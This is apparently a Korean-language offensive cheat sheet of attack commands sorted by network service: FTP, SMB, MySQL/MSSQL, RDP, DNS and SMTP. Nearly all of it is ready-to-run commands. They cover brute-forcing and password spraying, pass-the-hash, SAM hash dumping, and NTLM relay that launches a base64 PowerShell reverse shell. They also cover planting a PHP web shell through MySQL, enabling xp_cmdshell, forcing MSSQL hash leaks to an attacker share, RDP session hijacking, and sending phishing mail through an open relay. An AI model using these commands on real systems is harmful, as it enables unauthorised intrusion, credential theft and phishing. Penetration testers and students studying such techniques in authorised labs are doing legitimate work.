# 1. FTP

### Medusa를 이용한 Brute Forcing 
```medusa -u <user> -P /usr/share/wordlists/rockyou.txt -h 192.168.1.1 -M ftp ```

### Hydra를 이용한 Brute Forcing
```hydra -L users.list -P passwords.list ftp://192.168.1.1 -t 4```

### FTP 바운스 공격 (-b 플래그)
```nmap -Pn -v -n -p80 -b anonymous:password@192.168.1.1 172.16.0.1```

### CoreFTP Exploit (CVE-2022-22836)
- https://www.exploit-db.com/exploits/50652<br/>
```curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops```

<br/><br/>
# 2. SMB

### Null Session 파일공유
```smbclient -N -L //192.168.1.1```<br/>
```smbmap -H 192.168.1.1```<br/>
```smbmap -H 192.168.1.1 -r notes```<br/>
```smbmap -H 192.168.1.1 --download "notes\note.txt"```<br/>
```smbmap -H 192.168.1.1 --upload test.txt "notes\test.txt"```

### Remote Procedure Call (RPC)
```
rpcclient -U'%' 192.168.1.1
rpcclient $> enumdomusers
```

### Enum4linux 툴
```./enum4linux-ng.py 192.168.1.1 -A -C```

### CrackMapExec(CME)를 사용한 password spraying
```crackmapexec smb 192.168.1.1 -u /tmp/userlist.txt -p <password> --local-auth```
- ```--local-auth``` : 도메인에 가입되지 않은 호스트 대상
- ```--continue-on-success``` : 유효한 로그인 발견 후 계속 진행

### Impacket PsExec 툴
```impacket-psexec <user>:<password>@192.168.1.1```
- ```impacket-smbexec``` : psexec와 유사, 로컬SMB 서버를 인스턴스화하여 명령 출력을 수신
- ```impacket-atexec``` : 작업 스케줄러 서비스를 통해 명령 실행 및 출력 반환
<br/><br/>
## CrackMapExec(CME)

### CMD 또는 PowerShell 실행 (-X 또는 -x 옵션)
```crackmapexec smb 192.168.1.1 -u Administrator -p <password> -x 'whoami' --exec-method smbexec```

### Logged-on Users 열거 (예 : 네트워크 대역)
```crackmapexec smb 192.168.1.0/24 -u administrator -p <password> --loggedon-users```

### SAM Database에서 Hash 추출
```crackmapexec smb 192.168.1.1 -u administrator -p <password> --sam```

### Pass-the-Hash (PtH)
```crackmapexec smb 192.168.1.1 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE```

### NetNTLM v1/v2 hashes 캡쳐
```responder -I <interface name>```<br/>
로그 위치 : ```/usr/share/responder/logs/```<br/>
```hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt```

### Impacket-ntlmrelayx를 사용한 SAM Database에서 Hash 추출 
```impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.1.1```

### Impacket-ntlmrelayx를 사용한 명령 실행 (예 : Reverse Shell)
```impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>```

## 'SMBGhost' Remote Code Execution
- https://www.exploit-db.com/exploits/48537

<br/><br/>
# 3. SQL Databases

## MySQL

### SQL Server에 연결
```mysql -u <user> -p<password> -h 192.168.1.1```

### Secure File Privileges 체크 (값이 비어 있으면 RW 가능)
```show variables like "secure_file_priv";```

### 로컬 파일 쓰기
```SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';```

### 로컬 파일 읽기
```select LOAD_FILE("/etc/passwd");```

<br/><br/>
## MSSQL

### SQL Server에 연결
```sqlcmd -S SRVMSSQL -U <user> -P <password> -y 30 -Y 30```<br/>
```sqsh -S 192.168.1.1 -U <user> -P <password> -h```<br/>
로컬 계정 : ```sqsh -S 192.168.1.1 -U .\\<user> -P <password> -h```<br/>
```mssqlclient.py -p 1433 <user>@192.168.1.1 -windows-auth```

### XP_CMDSHELL 활성화
```
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'
```

### 로컬 파일 읽기
```SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents```

### MSSQL Service Hash 캡쳐
- 먼저 `Responder`나 `impacket-smbserver`를 시작해야 함
```
EXEC master..xp_dirtree '\\192.168.1.1\share\'
  또는
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

### linked Servers 식별
```SELECT srvname, isremote FROM sysservers```
- `isremote`이 `1`은 원격 서버, `0`은 linked 서버를 의미<br/>
```EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]```

<br/><br/>
# 4. RDP

### Crowbar - Password Spraying
```crowbar -b rdp -s 192.168.1.1/32 -U users.txt -c <password>```

### Hydra - Password Spraying
```hydra -L usernames.txt -p <password> 192.168.1.1 rdp```

### RDP 세션 하이재킹 (Administrator 권한 필요, Server 2019 이전)
```query user```<br/>
```sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"```<br/>
```net start sessionhijack```

### (PtH)로 RDP GUI 접속 가능하도록 레지스트리 추가
```reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f```

## CVE-2019-0708 (BlueKeep)
- https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/

<br/><br/>
# 5. DNS

### DIG - AXFR Zone Transfer
```dig AXFR @ns1.domain.com domain.com```

### 루트 도메인의 모든 DNS서버 열거
```fierce --domain zonetransfer.me```

### 서브도메인 열거 - subfinder
```./subfinder -d domain.com -v```

### 서브도메인 열거 - subbrute (폐쇄망에서 유용)
```
echo "ns1.domain.com" > ./resolvers.txt
./subbrute domain.com -s ./names.txt -r ./resolvers.txt
```

### CNAME 레코드 열거
```host support.domain.com```<br/>
```nslookup support.domain.com```

<br/><br/>
# 6. SMTP

### Host - MX 레코드
```host -t MX domain.com```

### DIG - MX 레코드
```dig mx domain.com | grep "MX" | grep -v ";"```

### Host - A 레코드
```host -t A mail1.domain.com```

### VRFY 명령 (사용자 유효성 확인)
```
telnet 192.168.1.1 25
VRFY <user>
VRFY root
VRFY www-data
```

### EXPN 명령 (사용자, 그룹의 모든 사용자 유효성 확인)
```
telnet 192.168.1.1 25
EXPN support-team
```

### RCPT TO 명령 (메일 수신자 식별)
```
telnet 192.168.1.1 25
RCPT TO:john
```

### USER 명령 (POP3용 사용자 체크)
```
telnet 192.168.1.1 25
USER john
```

### 사용자 열거 자동화
```smtp-user-enum -M RCPT -U userlist.txt -D domain.com -t 192.168.1.1```

### 클라우드 - O365spray
```python3 o365spray.py --validate --domain domain.com```<br/>
```python3 o365spray.py --enum -U users.txt --domain domain.com```

### Hydra - Password Attack
```hydra -L users.txt -p <password> -f 192.168.1.1 pop3```

### O365 Spray - Password Spraying
```python3 o365spray.py --spray -U usersfound.txt -p <password> --count 1 --lockout 1 --domain domain.com```

### Open Relay 서비스 이용하여 메일 발송
```swaks --from notifications@domain.com --to employees@domain.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://domain.com/' --server 192.168.1.1```

## OpenSMTPD 6.6.1 - Remote Code Execution
- https://www.exploit-db.com/exploits/47984
- 
